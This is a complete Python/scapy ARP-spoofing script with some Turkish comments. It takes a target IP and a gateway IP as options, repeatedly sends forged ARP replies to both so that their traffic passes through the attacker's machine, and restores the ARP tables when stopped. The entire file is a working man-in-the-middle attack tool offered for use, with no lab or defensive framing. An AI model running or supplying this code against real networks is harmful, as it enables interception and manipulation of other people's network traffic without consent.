import scapy.all as scapy
import time
import optparse

def get_mac_address(ip):

     arp_request_packet= scapy.ARP(pdst=ip)
     #scapy.ls(scapy.ARP())
     broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     #scapy.ls(scapy.Ether())
     combined_packet = broadcast_packet/arp_request_packet
     answered_list= scapy.srp(combined_packet,timeout=1,verbose=False)[0]

     return answered_list[0][1].hwsrc


def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_address(target_ip)  # Hedef MAC adresini al
    if target_mac is None:
        print(f"[ERROR] Could not get MAC address for {target_ip}")  # Hedef MAC adresi alınamadığında hata mesajı
        return  # Hedef MAC adresi bulunamazsa fonksiyonu sonlandır

    attacker_mac = scapy.get_if_hwaddr("eth0")  # Saldırganın MAC adresini al

    # Ethernet + ARP paketini oluştur
    arp_response = scapy.Ether(dst=target_mac, src=attacker_mac) / scapy.ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip, hwsrc=attacker_mac
    )

    scapy.sendp(arp_response, verbose=False)  # sendp kullanarak Ethernet çerçevesini gönder


def reset_operation(fooled_ip,gateway_ip):

    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,)
    scapy.send(arp_response,verbose=False,count=6)

def get_user_input():
    parse_object =optparse.OptionParser()

    parse_object.add_option("-t","--target",dest="target_ip",help="Enter Target IP")
    parse_object.add_option("-g","--gateway",dest="gateway_ip",help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")
    return options

user_ips  = get_user_input()
user_target_ip = user_ips.target_ip
user_gateway_ip = user_ips.gateway_ip

try:
    while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip, user_target_ip)

        print("\rSending packets", end="")
        time.sleep(3)
except KeyboardInterrupt:
      print("\nQuit & Reset")
      reset_operation(user_target_ip,user_gateway_ip)
      reset_operation(user_gateway_ip,user_target_ip)